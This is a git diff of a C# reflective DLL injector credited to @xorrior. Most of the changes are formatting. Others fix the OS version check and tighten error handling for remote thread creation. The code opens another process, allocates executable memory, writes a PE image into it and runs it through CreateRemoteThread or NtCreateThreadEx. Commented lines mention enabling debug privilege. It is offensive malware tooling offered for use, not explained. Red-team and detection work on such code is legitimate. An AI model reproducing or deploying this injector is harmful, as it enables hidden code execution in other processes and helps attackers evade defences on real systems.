@@ -2,6 +2,7 @@
 using System.Text;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Diagnostics;
 
 /// <summary>
 /// Author: @xorrior (Chris Ross)
@@ -12,6 +13,7 @@ namespace ReflectiveInjector
 {
     public class Injector
     {
+
         public int processId;
         private byte[] pe;
 
@@ -44,7 +46,7 @@ namespace ReflectiveInjector
             uint alloc_type = (MEM_COMMIT | MEM_RESERVE);
             baseAddress = VirtualAlloc(IntPtr.Zero, (UIntPtr)pe.Length, alloc_type, 0x40 /*PAGE_READ_Write_Execute*/);
 #if DEBUG
-            Console.WriteLine("Allocated memory locally at address: "+baseAddress.ToString("X8"));
+            Console.WriteLine("Allocated memory locally at address: " + baseAddress.ToString("X8"));
 #endif
 
             return LoadLibrary();
@@ -54,12 +56,15 @@ namespace ReflectiveInjector
         {
             bool success = false;
             Export = FunctionName;
+            //Enable SeDebugPrivilege in one function call. Gotta love .NET :)
+            //Process.EnterDebugMode();
 #if DEBUG
             Console.WriteLine("In Inject function");
 #endif
             //Main function that injects into a remote process
             //Get a handle to the target process
             uint Access = (VM_CREATE_THREAD | VM_QUERY | VM_OPERATION | VM_WRITE | VM_READ);
+            //uint allAccess = (0x000F0000 | 0x00100000 | 0xFFF);
             hProcess = OpenProcess(Access, false, processId);
             if (hProcess == IntPtr.Zero)
                 return success;
@@ -76,7 +81,7 @@ namespace ReflectiveInjector
         private bool LoadLibrary()
         {
             //Function to load the library locally
-            
+
             //Find the offset of the ReflectiveLoaderFunction locally
             ReflectiveLoaderOffset = FindExportOffset();
             if (ReflectiveLoaderOffset != 0)
@@ -104,7 +109,7 @@ namespace ReflectiveInjector
         }
         private unsafe bool LoadRemoteLibrary()
         {
-            fixed(byte* buffer = pe)
+            fixed (byte* buffer = pe)
             {
                 //Find the offset of the ReflectiveLoaderFunction
                 ReflectiveLoaderOffset = FindExportOffset();
@@ -129,11 +134,11 @@ namespace ReflectiveInjector
                     Console.WriteLine("Located offset to ReflectiveLoader function in remote process: " + RemoteReflectiveLoader.ToString("X8"));
 #endif
                     //OS Version determines whether to use CreateRemoteThread or NtCreateThreadEx
-                    var Osv = Environment.Version;
-                    if (Osv >= new Version(6,0) && Osv < new Version(6,2))
+                    var Osv = Environment.OSVersion.Version;
+                    if (Osv >= new Version(6, 0) && Osv < new Version(6, 2))
                     {
-                        uint retVal = NtCreateThreadEx(ref hThread, 0x1fffff, IntPtr.Zero, hProcess, RemoteReflectiveLoader, IntPtr.Zero, false, 0, 0xffff, 0xffff, IntPtr.Zero);
-                        if (hThread == IntPtr.Zero)
+                        uint retVal = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, hProcess, RemoteReflectiveLoader, IntPtr.Zero, false, 0, 0xFFFF, 0xFFFF, IntPtr.Zero);
+                        if (hThread == IntPtr.Zero || retVal != 0)
                             return false;
 #if DEBUG
                         Console.WriteLine("Called NtCreateThreadEx. Return value: " + retVal);
@@ -169,7 +174,7 @@ namespace ReflectiveInjector
             IMAGE_EXPORT_DIRECTORY ExpDir;
             //Function for finding the Rva of the reflective loader
 
-            fixed(byte* buffer = pe)
+            fixed (byte* buffer = pe)
             {
                 uint e_lfanew = *((uint*)(buffer + 60));
                 pe_header = (buffer + e_lfanew);
@@ -344,28 +349,28 @@ namespace ReflectiveInjector
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool WriteProcessMemory(
-            IntPtr hProcess, 
-            IntPtr lpBaseAddress, 
-            IntPtr lpBuffer, 
-            uint dwSize, 
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            IntPtr lpBuffer,
+            uint dwSize,
             ref int lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr CreateRemoteThread(
-            IntPtr hProcess, 
-            IntPtr lpThreadAttributes, 
-            uint dwStackSize, 
-            IntPtr lpStartAddress, 
-            IntPtr lpParameter, 
-            uint dwCreationFlags, 
+            IntPtr hProcess,
+            IntPtr lpThreadAttributes,
+            uint dwStackSize,
+            IntPtr lpStartAddress,
+            IntPtr lpParameter,
+            uint dwCreationFlags,
             IntPtr lpThreadId);
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         private static extern IntPtr VirtualAllocEx(
-            IntPtr hProcess, 
-            IntPtr lpAddress, 
-            IntPtr dwSize, 
-            uint flAllocationType, 
+            IntPtr hProcess,
+            IntPtr lpAddress,
+            IntPtr dwSize,
+            uint flAllocationType,
             uint flProtect);
 
         [DllImport("kernel32.dll", SetLastError = true)]
